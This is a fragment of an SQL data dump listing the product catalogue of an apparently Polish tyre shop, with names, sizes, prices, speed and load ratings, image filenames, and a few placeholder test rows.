(20, 43, '185/65r14', '', '', 0.00, '', '2011-12-29 12:40:53', '2011-12-29 12:42:24', 'Y', 'N', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(4, 56, '15/75', '<p>\r\n	asdaasdasdsdasdasd asdasjmn nasd&nbsp; asdas asd sad</p>\r\n', '<p>\r\n	asdasd</p>\r\n', 0.00, '20111125162211_real.jpg', '2011-11-25 16:21:44', '2011-12-28 09:01:00', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(8, 80, 'df', '<p>\r\n	dfdf</p>\r\n', '', 0.00, '', '2011-12-28 08:59:37', '2011-12-28 09:00:52', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(9, 43, 'Matador MP52 155/80R13 79T', '', '', 145.00, '20130816195248_matador_mp_52_nordicca_basic_155_80_r13_79_t.jpg', '2011-12-28 10:20:40', '2013-08-29 20:06:55', 'N', 'Y', ' MP52', 'Osobowe', 'Matador', 2, '155/80R13', 'T - do 190 km/h', 0, '', '79  - do 437 kg ', 1, '', '', '', '', '', '', '', ''),
(10, 80, 'asd', '<p>\r\n	asd</p>\r\n', '', 0.00, '20111228112848_sportivo_001_grafit.png', '2011-12-28 10:28:31', '2011-12-28 10:30:14', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(11, 80, 'Kormoran SNOWPRO 165/65R14 79T', '', '', 0.00, '', '2011-12-28 10:30:38', '2013-08-16 18:03:12', 'N', 'Y', 'Frigo 2', 'Osobowe', 'Dębica', 2, '185/70R13 ', 'T - do 190 km/h', 0, 'sda', '86 - do 530  kg', 1, '', '', '', '', '', '', '', ''),
(12, 43, 'Kelly Winter ST 165/70R14 81T', '', '', 170.00, '20130816200504_20120130144343_big_kelly_winter_st_1318428558.jpg', '2011-12-29 09:15:32', '2013-08-16 18:05:04', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly', 2, '165/70R14', 'T - do 190 km/h', 0, '', '81 - do 462 kg', 1, '', '', '', '', '', '', '', ''),
(13, 43, 'Kelly Winter ST 175/65R14 82T', '', '', 180.00, '20130816200823_20120130144343_big_kelly_winter_st_1318428558.jpg', '2011-12-29 10:54:59', '2013-08-29 19:16:57', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly ', 2, '175/65R14', 'T - do 190 km/h', 0, '', '82  - do 475 kg', 1, '', '', '', '', '', '', '', ''),
(14, 43, ' Kleber KRISALP HP2 175/65R14 82T', '', '', 195.00, '20130829215623_kleber_krisalp_hp_2_185_65_r14_86_t.jpg', '2011-12-29 12:29:12', '2013-08-29 19:56:56', 'N', 'Y', 'KRISALP HP2', 'Osobowe', 'Kleber', 2, '175/65R14', 'T - do 190 km/h', 0, '', '82  - do 475 kg', 1, '', '', '', '', '', '', '', ''),
(15, 43, 'Kelly Winter ST 175/70R14 84T', '', '', 180.00, '20111231094036_big_kelly_winter_st_1318428558.jpg', '2011-12-29 12:30:01', '2013-08-29 20:16:03', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly ', 2, '175/70R14', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(21, 43, '175/70 R14', '<p>\r\n	sdgf</p>\r\n', '<p>\r\n	sdf</p>\r\n', 0.00, '', '2011-12-29 12:41:25', '2011-12-29 12:42:17', 'Y', 'N', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(22, 43, 'Kelly Winter ST 185/60R14 82T', '', '', 190.00, '20130829215807_20111231094036_big_kelly_winter_st_1318428558.jpg', '2011-12-29 12:43:39', '2013-08-29 19:58:07', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly ', 2, '185/60R14', 'T - do 190 km/h', 0, '', '82 - do 475 kg', 1, '', '', '', '', '', '', '', ''),
(23, 43, 'Dębica Frigo 2 185/65R14 86T', '', '', 190.00, '20120130144459_debica_frigo_2.jpg', '2011-12-29 12:44:12', '2013-08-29 19:35:34', 'N', 'Y', 'Frigo 2', 'Osobowe', 'Dębica', 2, '185/65R14', 'T - do 190 km/h', 0, '', '86 - do 530 kg', 1, '', '', '', '', '', '', '', ''),
(24, 43, 'Matador MP52 185/65R14 86T', '', '', 200.00, '20130829214218_20130816195248_matador_mp_52_nordicca_basic_155_80_r13_79_t.jpg', '2011-12-29 12:45:03', '2013-08-29 19:42:45', 'N', 'Y', 'MP52', 'Osobowe', 'Matador ', 2, '185/65R14', 'T - do 190 km/h', 0, '', '86 - do 530 kg', 1, '', '', '', '', '', '', '', ''),
(25, 43, ' Kelly Winter ST 185/70R14 84T', '', '', 210.00, '20130816201643_20120130144343_big_kelly_winter_st_1318428558.jpg', '2011-12-29 12:45:33', '2013-08-29 20:17:07', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly', 2, '185/70R14', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(26, 43, 'Kelly Winter ST 185/65R15 88T', '', '', 200.00, '20111230115227_big_kelly_winter_st_1318428558.jpg', '2011-12-29 12:45:53', '2013-08-29 19:45:54', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly', 2, '185/65R15', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(27, 80, '185/65R15', '', '', 0.00, '20111230152031_big_kelly_winter_st_1318428558.jpg', '2011-12-29 12:46:15', '2013-08-29 19:58:49', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly ', 2, '185/70 R14', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(28, 43, 'Kelly Winter ST 195/60R15 88T', '', '', 220.00, '20111230155322_big_kelly_winter_st_1318428558.jpg', '2011-12-29 12:46:57', '2013-08-29 20:02:20', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly', 2, '195/60R15', 'T - do 190 km/h', 0, '', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(29, 43, 'Nexen WINGUARD SNOW G 205/60R15 91T', '', '', 230.00, '20130917204605_20130822200835_images.jpg', '2011-12-29 12:47:45', '2013-09-17 18:46:26', 'N', 'Y', 'WINGUARD SNOW G', 'Osobowe', 'Nexen ', 2, '205/60R15', 'T - do 190 km/h', 1, '', '91 ', 1, '', '', '', '', '', '', '', ''),
(30, 43, 'Goodyear ULTRA GRIP 8 195/65R15 91T', '', '', 250.00, '', '2011-12-29 12:48:24', '2013-09-11 17:10:39', 'N', 'Y', 'ULTRA GRIP 8', 'Osobowe', 'Goodyear', 2, '195/65R15 ', 'T - do 190 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(31, 43, 'Kelly Winter ST 195/65R15 91T', '', '', 210.00, '20111229142321_big_kelly_winter_st_1318428558.jpg', '2011-12-29 12:48:51', '2012-11-05 20:01:13', 'N', 'Y', 'Winter St ', 'Osobowe', 'Kelly ', 2, '195/65R15', 'T - do 190 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(32, 43, 'Dębica Frigo 2 195/65R15 91T', '', '', 210.00, '20111229151241_opona_dEbica_frigo_2.jpg', '2011-12-29 12:49:20', '2012-11-05 20:03:10', 'N', 'Y', 'Frigo 2', 'Osobowe', 'Dębica', 2, '195/65R15', 'T - do 190 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(33, 43, 'Dayton DW510 205/65R15 94T', '', '', 0.00, '20130917203841_3555887005.jpg', '2011-12-29 12:49:34', '2013-09-17 18:38:41', 'N', 'Y', 'DW510', 'Osobowe', 'Dayton', 2, '205/65r15', 'T - do 190 km/h', 0, '', '94 - do 670 kg', 1, '', '', '', '', '', '', '', ''),
(34, 43, 'Kelly Winter ST 205/55R16 91T', '', '', 280.00, '20130820122813_20121121115342_big_kelly_winter_st_1318428558.jpg', '2011-12-29 12:50:51', '2013-08-20 10:28:13', 'N', 'Y', 'Winter ST', 'Osobowe', 'Kelly', 2, '205/55R16', 'T - do 190 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(35, 43, 'Dębica Frigo HP 205/55R16 91H', '', '', 290.00, '20130820124634_opona_205_60r16_debica_f_24.jpg', '2011-12-29 12:51:06', '2013-08-20 10:46:34', 'N', 'Y', 'Frigo HP', 'Osobowe', 'Dębica ', 2, '205/55R16', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(36, 43, 'Fulda KRISTALL CONTROL HP 205/55R16 91H', '', '', 350.00, '20130820141829_fulda_kristall_control_hp_205_55r16_91h.jpg', '2011-12-29 12:51:30', '2013-08-20 12:19:15', 'N', 'Y', 'KRISTALL CONTROL HP', 'Osobowe', 'Fulda', 2, '205/55r16', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(37, 43, 'Barum Polaris 3 215/55R16 99H XL', '', '', 390.00, '20130820121823_3477542277.jpg', '2011-12-29 12:54:48', '2013-08-20 10:20:40', 'N', 'Y', 'Polaris 3', 'Osobowe', 'Barum', 2, '215/55R16', 'H - do 210 km/h', 0, '', '99 - do 775 kg  ', 1, '', '', '', '', '', '', '', ''),
(38, 43, 'Sava ESKIMO HP 225/55R16 95H', '', '', 390.00, '20130829214714_sava_eskimo_hp_215_55_16_6997.jpg', '2011-12-29 13:25:15', '2013-08-29 19:47:14', 'N', 'Y', 'ESKIMO HP', 'Osobowe', 'Sava', 2, '225/55R16', 'H - do 210 km/h', 0, '', '95 - do 750 kg', 1, '', '', '', '', '', '', '', ''),
(39, 43, ' Sava ESKIMO HP 215/60R16 99H', '', '<p>\r\n	asd</p>\r\n', 370.00, '20130829205947_sava_eskimo_hp_215_55_16_6997.jpg', '2011-12-29 19:45:18', '2013-08-29 18:59:47', 'N', 'Y', 'ESKIMO HP', 'Osobowe', 'Sava', 2, '215/60R16', 'H - do 210 km/h', 0, '', '99 - do 775 kg', 1, '', '', '', '', '', '', '', ''),
(40, 43, 'Nexen 225/45R17 95V', '', '', 300.00, '20130820121137_3477737719.jpg', '2011-12-29 19:51:10', '2013-08-29 19:01:09', 'N', 'Y', 'WINGUARD SPORT', 'Osobowe', 'Nexen', 2, ' 225/45R17', 'V - do 240 km/h', 0, '', '95- do 690 kg', 1, '', '', '', '', '', '', '', ''),
(41, 54, 'Gał Gum Steel 145/70R13 71Q', '', '', 110.00, '20130820120443_20120810114205_1334051147_dsc_4911.jpg', '2011-12-29 19:55:56', '2013-08-20 10:04:43', 'N', 'Y', 'Steel ', 'Osobowe', 'Gał Gum', 2, '145/70R13', 'Q - do 160 km/h', 0, '', '71 -	do 345 kg', 1, '', '', '', '', '', '', '', ''),
(42, 54, 'Gał Gum Steel 155/70R13 75T', '', '', 110.00, '20130820120307_20120810114205_1334051147_dsc_4911.jpg', '2011-12-29 19:56:43', '2013-08-20 10:03:07', 'N', 'Y', 'Steel', 'Osobowe', 'Gał Gum', 2, '155/70R13', 'T - do 190 km/h', 0, '', '75 - do 385 kg', 1, '', '', '', '', '', '', '', ''),
(43, 54, 'Gał Gum 165/70R13 76S', '', '', 110.00, '20130820120114_20120810133758_1334051757_dsc_4930.jpg', '2011-12-29 19:57:16', '2013-08-20 10:01:14', 'N', 'Y', '---', 'Osobowe', 'Gał Gum', 2, '165/70R13', 'S - do 180 km/h', 0, '', '76 - do 400 kg', 1, '', '', '', '', '', '', '', ''),
(44, 54, 'Gał Gum Steel 175/70R13 82S', '', '', 120.00, '20130820115936_20120810114010_1334051684_dsc_4923.jpg', '2011-12-29 19:57:33', '2013-08-20 09:59:42', 'N', 'Y', 'Steel ', 'Osobowe', 'Gał Gum', 2, '175/70R13', 'T - do 190 km/h', 1, '', '82 - do 475 kg', 1, '', '', '', '', '', '', '', ''),
(45, 54, 'Gał Gum 155/80R13', '', '', 0.00, '20130820114843_20120810134014_1334051147_dsc_4911.jpg', '2011-12-29 19:58:00', '2013-08-20 09:48:43', 'N', 'Y', '-', 'Osobowe', 'Gał Gum', 2, '155/80R13', 'T - do 190 km/h', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(46, 54, 'Gał Gum 165/70R14 84T', '', '', 120.00, '20120810114322_1334051863_dsc_4906.jpg', '2011-12-29 19:58:19', '2013-08-20 09:46:38', 'N', 'Y', 'ALP3', 'Osobowe', 'Gał Gum', 2, '165/70R14', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(47, 54, 'Gał Gum ALP3 175/65R14 86Q', '', '', 140.00, '20120810114430_1334052385_dsc_4895_(1).jpg', '2011-12-29 19:58:50', '2013-08-20 09:46:09', 'N', 'Y', 'ALP3', 'Osobowe', 'Gał Gum', 2, '175/65R14', 'Q - do 160 km/h', 0, '', '86 - do 530 kg', 1, '', '', '', '', '', '', '', ''),
(48, 54, 'Gał Gum 175/70R14 84T', '', '', 120.00, '20120810135344_1334051757_dsc_4930.jpg', '2011-12-29 19:59:10', '2013-08-20 09:45:46', 'N', 'Y', '---', 'Osobowe', 'Gał Gum', 2, '175/70R14', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(49, 54, 'Gał Gum STEEL M770 185/60R14', '', '', 130.00, '20130820114519_20120810140708_1334051948_dsc_4908.jpg', '2011-12-29 19:59:36', '2013-08-20 09:45:19', 'N', 'Y', 'STEEL M770', 'Osobowe', 'Gał Gum', 2, '185/60R14', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(50, 54, 'Gał Gum ALP3 185/65R14 86Q', '', '', 140.00, '20120117121626_195_65_15.jpg', '2011-12-29 19:59:55', '2013-08-20 08:47:25', 'N', 'Y', 'ALP3', 'Osobowe', 'Gał Gum', 2, '185/65R14', 'Q - do 160 km/h', 0, '', '86 - do 530 kg', 1, '', '', '', '', '', '', '', ''),
(51, 54, 'Gał Gum ALP3 185/70R14 86Q', '', '', 140.00, '20130820103338_20120810135749_1334052385_dsc_4895.jpg', '2011-12-29 20:00:41', '2013-08-20 08:33:39', 'N', 'Y', 'ALP3', 'Osobowe', 'Gał Gum', 2, '185/70 R14', 'Q - do 160 km/h', 0, '', '86 - do 530 kg', 1, '', '', '', '', '', '', '', ''),
(52, 54, 'Gał Gum STEEL M770 185/65R15 86Q', '', '', 140.00, '20120810140708_1334051948_dsc_4908.jpg', '2011-12-29 20:01:52', '2013-02-08 11:35:54', 'N', 'Y', 'STEEL M770', 'Osobowe', 'Gał Gum', 2, '185/65R15', 'T - do 190 km/h', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(53, 54, 'Gał Gum 195/50R15 86Q', '', '', 140.00, '20120810135614_1334055607_dsc_4916.jpg', '2011-12-29 20:02:18', '2013-03-14 10:25:16', 'N', 'Y', 'ALP3', 'Osobowe', 'Gał Gum', 2, '195/50R15', 'Q - do 160 km/h', 0, '', '86 - do 530 kg', 1, '', '', '', '', '', '', '', ''),
(54, 54, 'Gał Gum 195/55R15 91H', '', '', 150.00, '20120810135749_1334052385_dsc_4895.jpg', '2011-12-29 20:02:39', '2013-03-14 10:25:08', 'N', 'Y', 'ALP3', 'Osobowe', 'Gał Gum', 2, '195/55R15', 'T - do 190 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(55, 54, 'Gał Gum 195/60R15 86Q', '', '', 140.00, '20120810134918_1334055607_dsc_4916.jpg', '2011-12-29 20:03:02', '2013-03-14 10:24:59', 'N', 'Y', 'W790', 'Osobowe', 'Gał Gum', 2, '205/55R16', 'Q - do 160 km/h', 0, '', '86 - do 530 kg', 1, '', '', '', '', '', '', '', ''),
(56, 54, 'Gał Gum  ALP3  195/65R15 91H', '', '', 140.00, '20120810134637_1334052385_dsc_4895.jpg', '2011-12-29 20:03:27', '2012-10-16 19:11:49', 'N', 'Y', 'ALP3', 'Osobowe', 'Gał Gum', 2, '195/65R15', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(57, 54, 'Gał Gum 205/60R15 91H', '', '', 150.00, '20120810134117_1334055607_dsc_4916.jpg', '2011-12-29 20:04:02', '2013-02-28 20:29:55', 'N', 'Y', 'W790', 'Osobowe', 'Gał Gum', 2, '205/55 R16', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(58, 54, 'Gał Gum W790 205/55R16 91H', '', '', 160.00, '20120810113121_1334055607_dsc_4916_(1).jpg', '2011-12-29 20:04:23', '2013-02-22 09:50:00', 'N', 'Y', 'W790', 'Osobowe', 'Gał Gum', 2, '205/55 R16', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(59, 54, 'Gał Gum ALP3 225/45R17 91H', '', '', 220.00, '20130208123035_1334052385_dsc_4895.jpg', '2011-12-29 20:04:55', '2013-02-08 11:30:35', 'N', 'Y', 'ALP3', 'Osobowe', 'Gał Gum', 2, '225/45R17', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(60, 74, 'Matador MPS530 185R14C 102Q', '', '', 250.00, '', '2011-12-29 20:10:56', '2013-08-30 07:31:19', 'N', 'Y', 'MPS530', 'Dostawcze', 'Matador', 2, '185R14C', 'Q - do 160 km/h', 0, '', '102 - do 850 kg', 1, '', '', '', '', '', '', '', ''),
(61, 74, 'Fulda CONC TRAC 195/70R15C 104R', '', '', 350.00, '20130829223026_fulda_conveo_trac_m_s_195_70r15c_100_98r.jpg', '2012-01-02 08:22:17', '2013-08-29 20:30:26', 'N', 'Y', 'CONC TRAC', 'Dostawcze', 'Fulda', 2, '195/70R15C', 'R - do 170 km/h', 0, '', '104 - do 900 kg', 1, '', '', '', '', '', '', '', ''),
(62, 74, 'SAVA Trenta M&S 195/70R15C 104Q ', '', '', 300.00, '20120116151910_203.jpg', '2012-01-02 08:22:36', '2013-08-29 20:26:31', 'N', 'Y', 'Trenta M&S ', 'Dostawcze', 'Sava', 2, '195/70R15C', 'Q - do 160 km/h', 0, '', '104 - do 900 kg', 1, '', '', '', '', '', '', '', ''),
(63, 74, 'Matador MPS520 225/70R15C 112R', '', '', 390.00, '20120116151422_matador_mps520_500x500.jpg', '2012-01-02 08:25:52', '2013-08-29 20:27:02', 'N', 'Y', 'MPS520', 'Dostawcze', 'Matador ', 2, '225/70 R15C', 'R - do 170 km/h', 0, '', '112 - do 1120 kg', 1, '', '', '', '', '', '', '', ''),
(64, 74, 'Matador MPS520 215/65R16C 109R', '', '', 420.00, '20120116151609_matador_mps520_500x500.jpg', '2012-01-02 08:26:23', '2013-08-29 20:31:29', 'N', 'Y', 'MPS520', 'Dostawcze', 'Matador', 2, '215/65 R16C', 'R - do 170 km/h', 0, '', '109 - do 1030 kg', 1, '', '', '', '', '', '', '', ''),
(65, 74, 'Nexen EUROWIN 225/65R16C 112R', '', '', 390.00, '20130830092808_i_nexen_euro_winc_225_65r16c_112_110r.jpg', '2012-01-02 08:26:56', '2013-08-30 07:28:41', 'N', 'Y', 'EUROWIN', 'Dostawcze', 'Nexen', 2, '225/65R16C', 'R - do 170 km/h', 0, '', '112', 1, '', '', '', '', '', '', '', ''),
(66, 74, 'Sava Trenta 195/75R16C 107Q ', '', '', 350.00, '20120116152351_203.jpg', '2012-01-02 08:27:31', '2013-08-29 20:32:17', 'N', 'Y', 'Trenta', 'Dostawcze', 'Sava', 2, '195/75 R16C', 'Q - do 160 km/h', 0, '', '107 - do 975 kg', 1, '', '', '', '', '', '', '', ''),
(67, 74, 'Matador MPS530 215/75R16C 116N', '', '', 480.00, '', '2012-01-02 08:28:00', '2013-08-29 20:32:55', 'N', 'Y', 'MPS530', 'Dostawcze', 'Matador', 2, '215/75R16C', 'N - do 140 km/h', 0, '', '116 - do 1250 kg', 1, '', '', '', '', '', '', '', ''),
(68, 55, 'Dębica AM2 4.00- 8 4PR', '', '', 50.00, '20130711181815_debica_am_2_4_00_8_6pr.jpg', '2012-01-04 11:26:20', '2013-07-11 16:18:15', 'N', 'Y', 'AM2 ', 'Rolnicze', 'Dębica', 2, '4.00-8', '', 1, '4PR', '--', 1, '', '', '', '', '', '', '', ''),
(69, 55, 'Dębica AM-2  4.00-10 2PR', '', '', 70.00, '20130312132739_400_10_debica_am_2_4_pr_tt.jpg', '2012-01-04 11:26:35', '2013-03-27 11:52:46', 'N', 'Y', 'AM-2', 'Rolnicze', 'Dębica', 2, '4.00 - 10 ', 'Q - do 160 km/h', 1, '2PR', 'do -185 kg', 1, '', '', '', '', '', '', '', ''),
(70, 55, 'Trottar 6.00-16 8PR ', '', '', 190.00, '20130712204134_agtech_6_00_16_tp005_8pr_kostka.jpg', '2012-01-04 11:27:16', '2013-07-12 18:41:34', 'N', 'Y', 'SW-201', 'Rolnicze', 'Trottar', 2, '6.00-16 ', '', 1, '8 PR', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(71, 55, 'Ozka KNK35 6.00-16  8PR 88 TT ', '', '', 220.00, '20130220201516_20130207133938_opona_6_00_16_6pr_tp005.jpg', '2012-01-04 11:28:37', '2013-03-27 09:29:16', 'N', 'Y', ' KNK35', 'Rolnicze', 'Ozka - Turcja', 0, '6.00-16', '', 1, '8 PR', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(72, 55, 'Ozka KNK35 6.50-16  8PR 88 TT ', '', '', 270.00, '20130207133938_opona_6_00_16_6pr_tp005.jpg', '2012-01-12 09:42:54', '2013-03-28 12:34:06', 'N', 'Y', 'KNK35 ', 'Rolnicze', 'OZKA', 0, '6.50-16 ', '', 1, '8 PR', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(73, 55, 'Ozka KNK32  7.50-16 8PR ', '', '', 310.00, '20130712204258_750_16_bkt_tf_8181_6_pr_tt.jpg', '2012-01-13 21:24:25', '2013-07-12 18:42:58', 'N', 'Y', 'KNK32 ', 'Rolnicze', 'Ozka - Turcja', 2, '7.50-16', '', 1, '8 PR', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(74, 55, 'BKT 10.0/75-15.3 10PR TL', '', '', 310.00, '20120113224116_00000000000000141.jpg', '2012-01-13 21:29:55', '2013-07-10 08:01:49', 'N', 'Y', 'AW-702', 'Maszyny Rolnicze', 'BKT', 0, '10.0/75-15.3', '', 1, '10 PR', '128 - do 1800 kg', 1, '', '', '', '', '', '', '', ''),
(75, 55, 'Stomil Poznań AM21 10.0/75-15.3 10PR', '', '', 300.00, '20130220191638_00655_m_stomil_poznan_am_21.jpg', '2012-01-13 21:34:54', '2013-02-22 09:48:22', 'N', 'Y', 'AM21', 'Maszyny Rolnicze', 'Stomil Poznań', 0, '10.0/75-15.3 ', '', 1, '10PR', '123 - do 1550kg', 1, '', '', '', '', '', '', '', ''),
(76, 55, 'BKT 11.5/80-15.3  10PR TT', '', '', 400.00, '20120116122144_00000000000000141.jpg', '2012-01-13 21:35:06', '2013-03-28 13:27:04', 'N', 'Y', 'AW-909', 'Maszyny Rolnicze', 'BKT', 0, '11.5/80-15.3', '', 1, '10PR', '137 - do 2300 kg ', 1, '', '', '', '', '', '', '', ''),
(77, 55, 'Dedico 11.5/80-15.3 ', '', '', 380.00, '20130829223449_3496938050.jpg', '2012-01-24 07:51:56', '2013-08-29 20:34:49', 'N', 'Y', '', 'Rolnicze', 'Dedico ', 0, '11.5/80-15.3 ', '', 1, '', '', 1, '', '', '', '', '', '', '', ''),
(78, 55, 'Mitas 400/60-15.5 14PR', '', '', 860.00, '20130312133139_20130220205340_400_60_155_mitas_im_07_14_pr_140a8_tl.jpg', '2012-01-24 08:04:39', '2013-03-27 11:47:33', 'N', 'Y', 'IM-07 ', 'Rolnicze', 'Mitas', 0, '400/60-15.5', '', 1, '14 PR', '140 - do 2500 kg', 1, '', '', '', '', '', '', '', ''),
(79, 55, 'Cultor AS AGRI 10 11.2-24 8PR TT', '', '', 750.00, '20130710145251_2_24_cultor_as_agri_10_8_pr_tt.jpg', '2012-01-24 08:07:29', '2013-07-10 12:52:51', 'N', 'Y', 'AS AGRI 10', 'Maszyny Rolnicze', 'Cultor ', 0, '11.2-24 ', '', 1, '8 PR', '116 - do 1250 kg', 1, '', '', '', '', '', '', '', ''),
(80, 55, 'Taurus Point 8 12.4R24  TL Radialna', '', '', 1300.00, '20130326124631_4r28_taurus_point_8_121a8.jpg', '2012-01-24 08:07:44', '2013-03-27 08:20:01', 'N', 'Y', 'Point 8', 'Rolnicze', 'Taurus', 0, '12.4R24', '', 1, '---', '119 - do 1360 kg', 1, '', '', '', '', '', '', '', ''),
(81, 55, 'Ozka KNK50 12.4-24 12PR TT ', '', '', 930.00, '20130327093352_01994_m_1.jpg', '2012-01-24 08:08:12', '2013-03-27 08:33:52', 'N', 'Y', 'KNK50', 'Rolnicze', 'Ozka - Turcja', 0, '12.4-24', '', 1, '12PR', '128 - do 1800 kg', 1, '', '', '', '', '', '', '', ''),
(82, 55, 'Taurus Point 70 360/70R24 TL Radialna', '', '', 1600.00, '20120130183405_taurus_12_4r_28_point.jpg', '2012-01-25 07:40:54', '2013-03-27 08:24:51', 'N', 'Y', 'Point 70', 'Rolnicze', 'Taurus', 0, '360/70R24', '', 1, '---', '122 - do 1500 kg', 1, '', '', '', '', '', '', '', ''),
(83, 55, 'Cultor AS AGRI 19 14.9-24 8PR TT', '', '', 1050.00, '20130712171842_20130710145251_2_24_cultor_as_agri_10_8_pr_tt.jpg', '2012-01-25 07:44:33', '2013-07-12 15:19:08', 'N', 'Y', 'AS AGRI 19', 'Rolnicze', 'Cultor - Serbia', 0, '14.9-24', '', 1, '8PR', '121 - do 1450 kg', 1, '', '', '', '', '', '', '', ''),
(84, 55, 'Starmaxx 12.4-28 8PR TT', '', '', 850.00, '20130711184914_pobrane.jpg', '2012-01-25 07:45:51', '2013-07-12 13:05:11', 'N', 'Y', 'TA60', 'Rolnicze', 'Starmaxx - Turcja', 0, '12.4-28', '', 1, '8 PR', '122 - do 1500 kg', 1, '', '', '', '', '', '', '', ''),
(85, 55, 'Cultor As-Agri 19 14.9-28 8PR TT', '', '', 1100.00, '20130220190333_as_agri95_32_500x500.jpg', '2012-01-25 10:33:37', '2013-03-27 14:18:37', 'N', 'Y', 'As-Agri 19 ', 'Rolnicze', 'Cultor - Serbia', 0, '14.9-28', '', 1, '8 PR', '130 - do 1900 kg', 1, '', '', '', '', '', '', '', ''),
(86, 55, 'Ozka KNK50 16.9-28 10PR TT', '', '', 1490.00, '20130328133122_9_28_seha_knk50_10pr_tt_.jpg', '2012-01-25 10:35:17', '2013-03-28 12:32:04', 'N', 'Y', 'KNK50 ', 'Maszyny Rolnicze', 'Ozka - Turcja', 0, '16.9-28 ', '', 1, '10PR', '139 - do 2430 kg', 1, '', '', '', '', '', '', '', ''),
(87, 55, 'Mitas TD-13 16.9-30 10PR', '', '', 1650.00, '20130305095443_mitas_16_9_30_td_13_10_pr_140_a6_132_a8_tt.jpg', '2012-01-27 11:58:30', '2013-03-27 14:21:06', 'N', 'Y', 'TD-13', 'Rolnicze', 'Mitas - Czechy', 0, '16,9-30', '', 1, '10PR', '140A6/132A8', 1, '', '', '', '', '', '', '', ''),
(88, 55, 'Ozka KNK50  18.4-30 10PR TT', '', '', 1890.00, '20130712161539_20130328133122_9_28_seha_knk50_10pr_tt_.jpg', '2012-01-27 11:59:01', '2013-07-12 14:28:25', 'N', 'Y', 'KNK50 ', 'Rolnicze', 'Ozka', 0, '18.4-30', '142 - do 2560 kg', 1, '10PR', '', 1, '', '', '', '', '', '', '', ''),
(89, 55, 'Cultor As-Agri 13 12.4-32  6PR 111A8 ', '', '', 1100.00, '20130305112001_20130220190333_as_agri95_32_500x500.jpg', '2012-01-30 13:53:47', '2013-03-27 14:21:34', 'N', 'Y', 'As-Agri 13 ', 'Rolnicze', 'Cultor - Serbia', 0, '12.4-32', '', 1, '6PR', '111 - do 1090 kg', 1, '', '', '', '', '', '', '', ''),
(90, 55, 'Ozka KNK50 16.9-34 10PR TT', '', '', 1750.00, '20130703160651_3362158552.jpg', '2012-01-30 13:53:57', '2013-07-10 07:35:31', 'N', 'Y', 'KNK50 ', 'Rolnicze ', 'Ozka', 0, '16.9-34', '', 1, '10PR', '142 - do 2560 kg', 1, '', '', '', '', '', '', '', ''),
(91, 55, 'Ozka KNK50 18.4-34 10PR', '', '', 2020.00, '20130712163021_02592_m_1.jpg', '2012-01-30 18:07:34', '2013-07-12 14:30:21', 'N', 'Y', 'KNK50 ', 'Rolnicze', 'Ozka', 0, '18.4-34', '', 1, '10PR', '', 1, '', '', '', '', '', '', '', ''),
(92, 55, 'Cultor  AS AGRI 13 16.9-38 8PR', '', '', 2000.00, '20130712203204_opona_16_9_38_8pr_mitas_td13_500x500.jpg', '2012-01-31 10:31:41', '2013-07-12 18:32:04', 'N', 'Y', 'AS AGRI 13', 'Rolnicze', 'Cultor - Serbia', 0, '16.9-38', '', 1, '8PR', '133 - do 2060 kg', 1, '', '', '', '', '', '', '', ''),
(93, 55, 'Ozka KNK50 18.4-38 10PR TT', '', '', 2200.00, '20130712203831_02592_m_1.jpg', '2012-02-02 15:16:31', '2013-07-12 18:38:47', 'N', 'Y', 'KNK50 ', 'Rolnicze', 'Ozka - Turcja', 0, '18.4 - 38', '', 1, '10PR', '---', 1, '', '', '', '', '', '', '', ''),
